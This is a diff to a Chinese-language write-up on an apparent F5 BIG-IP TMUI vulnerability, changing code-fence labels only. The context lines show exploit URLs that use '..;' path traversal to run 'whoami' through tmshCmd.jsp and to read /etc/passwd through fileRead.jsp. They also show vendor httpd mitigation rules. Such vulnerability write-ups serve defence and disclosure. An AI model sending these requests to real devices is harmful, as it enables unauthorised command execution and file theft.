@@ -103,11 +103,11 @@ description: 图是偷的，过程是自己的
 
 ### 4、 漏洞利用
 
-```text
-RCE:
+```bash
+## RCE:
 http://IP:PORT/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami
 
-文件读取：
+## 文件读取：
 http://IP:PORT/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
 ```
 
@@ -196,7 +196,7 @@ restart sys service httpd 并禁止外部IP对 TMUI 页面的访问。
 
 7 月 7 日更新： 官方初版安全通告里给出的临时缓解方案是在 httpd 配置文件中加入如下部分，以禁止请求的 url 路径里出现 ..; 进行路径跳转：
 
-```text
+```bash
 include '<LocationMatch ".*\.\.;.*">Redirect 404 /</LocationMatch>'
 ```
 
@@ -206,7 +206,7 @@ include '<LocationMatch ".*\.\.;.*">Redirect 404 /</LocationMatch>'
 
 官方安全通告里给出的第二版临时缓解方案中在 httpd 配置文件中加入规则配置如下，以禁止请求的 url 路径里出现 ; 进行授权认证绕过：
 
-```text
+```bash
 include '<LocationMatch ";">Redirect 404 /</LocationMatch>'
 ```
 
